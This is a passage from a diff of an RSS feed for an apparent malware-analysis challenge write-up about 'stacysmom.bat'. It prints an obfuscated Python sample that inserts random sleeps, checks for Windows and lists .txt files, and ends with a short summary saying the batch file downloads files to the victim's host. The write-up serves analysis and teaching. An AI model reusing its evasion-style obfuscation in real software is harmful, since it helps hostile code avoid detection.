+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">random&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">platform&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rng&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SystemRandom&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">generate_random_string&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">letters&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ascii_letters&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rng&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">letters&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_random_string_list&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rng&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">random_strings&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">length&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">random_strings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">generate_random_string&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">random_strings&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">rng&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">rng&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">random_strings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">random_strings&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">random_strings&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">min_val&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_val&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">rng&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">min_val&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max_val&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">pause_execution&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sleep_condition&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">sleep_condition&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sleep_duration&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">sleep_condition&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sleep_duration&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">oOoOoOoOoOoOoOoO&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">sleep_condition&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sleep_duration&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sleep_duration&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sleep_duration&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">get_random_string_list&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">should_pause_execution&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">condition1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">condition1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">condition2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">condition3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_random_int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pause_execution&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">condition3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">condition2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">is_running_on_windows&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;win&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">platform&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">platform&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">print_windows_warning&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;MAYBE YOU SHOULD RUN THIS ON WINDOWS?&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">find_and_manipulate_files&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">separator&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sep&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">current_dir&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getcwd&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">current_dir&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">separator&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">file&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">filename&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">listdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">current_dir&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">filename&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">endswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.txt&amp;#39;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">file_list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">file_list&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">process_items&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">items&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">processed_items&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">last_item&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">items&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">last_item&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">last_item&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">last_item&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">processed_items&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">item&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">processed_items&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">last_item&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">item&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">processed_items&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">reverse&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">processed_items&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">incomplete_function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">run_script&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">is_running_on_windows&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">files&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">find_and_manipulate_files&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">processed_files&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process_items&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">files&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">should_pause_execution&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">incomplete_function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">processed_files&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">print_windows_warning&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">encoded_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;CiAgICAgIyUlICAgICAgICAgICAgICUlJSAgICAgCiAgICAgJSUlJSUgICAgICAgICAlJSUlJSAgICAgCiAgICAgJSUlJSUlJSAgICAgJSUlJSUlJSAgICAgCiAgICAgJSUlJSUlJSUlICUlJSUlJSUlJSAgICAgCiAgJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSAgCiAlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUgCiAlJSUlJSUlICUlJSUlJSUlJSUlICUlJSUlJSUgCiAlJSUlJSUlJSAgJSUlJSUlJSAgJSUlJSUlJSUgCiAlJSUlJSUlJSUlICAlJSUgICUlJSUlJSUlJSUgCiAlJSUlJSUlJSUgICAgICAgICAlJSUlJSUlJSUgCiAlJSUlJSUlICAgICAgICAgICAgICUlJSUlJSUKIApNYWxjb3JlOiBTaW1wbGUgRmlsZSBBbmFseXNpcw==&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">decoded_string&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">encoded_string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">decoded_string&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">run_script&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h1 id="summary">Summary
+&lt;/h1>&lt;p>The execution of &lt;strong>stacysmom.bat&lt;/strong> producing several files downloaded on the victim&amp;rsquo;s host. There were a lot of obfuscation happening in those scripts as discussed before. The main purpose of the executables is to accessing &amp;ldquo;&lt;a class="link" href="https://link.malcore.io" target="_blank" rel="noopener"
+>https://link.malcore.io&lt;/a>&amp;rdquo; url. With that, a simple diagram to understanding &lt;strong>stacysmom.bat&lt;/strong> behavior are as below.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/malcore-chall/image5.png"
+width="903"
+height="646"
+srcset="https://n3rr.github.io/p/malcore-chall/image5_hu18154810558950855335.png 480w, https://n3rr.github.io/p/malcore-chall/image5_hu8427284699019732043.png 1024w"
+loading="lazy"
+alt="Simple Flowchart for stacysmom.bat"
+class="gallery-image"
+data-flex-grow="139"
+data-flex-basis="335px"
+>&lt;/p></description></item></channel></rss>
